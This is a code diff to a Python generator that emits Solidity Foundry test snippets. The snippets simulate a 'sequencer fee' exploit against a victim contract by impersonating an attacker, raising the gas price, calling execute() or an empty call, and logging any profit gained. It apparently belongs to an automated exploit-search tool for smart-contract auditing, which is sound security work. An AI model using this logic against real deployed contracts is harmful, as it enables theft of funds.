@@ -404,21 +404,33 @@ def _get_sequencer_fee_logic(bug_type: Optional[str]) -> str:
         return ""
     
     return """
+        // Adaptive Simulation for Sequencer Fee (Updated Strategy)
+        // Ensure tx.origin is attacker for refund checks
+        vm.stopPrank();
+        vm.startPrank(attacker, attacker);
+
         vm.deal(attacker, 1 ether);
         uint256 sfBalBefore = attacker.balance;
         
+        // 1. High Gas Price Simulation (200 gwei)
+        vm.txGasPrice(200000000000); 
+        
         bool sfSuccess;
-        (sfSuccess, ) = victim.call{value: 0.0001 ether}("");
+        // Attempt standard execute
+        (sfSuccess, ) = victim.call{value: 0.0001 ether}(abi.encodeWithSignature("execute()"));
         
         if (!sfSuccess) {
-             (sfSuccess, ) = victim.call{value: 0.0001 ether}(abi.encodeWithSignature("execute()"));
+             // 2. Fallback / Empty Call (0x) with 1 wei
+             // Often profit triggers via empty call
+             (sfSuccess, ) = victim.call{value: 1 wei}("");
         }
         
         if (sfSuccess) {
              uint256 sfBalAfter = attacker.balance;
+             // Check if contract returned part of gas/funds
              if (sfBalAfter > sfBalBefore) {
                  console.log("PROFIT_WEI:", sfBalAfter - sfBalBefore);
-                 console.log("SUCCESS_METHOD: sequencer_fee_exploit");
+                 console.log("SUCCESS_METHOD: sequencer_fee_high_gas");
                  vm.stopPrank();
                  return;
              }
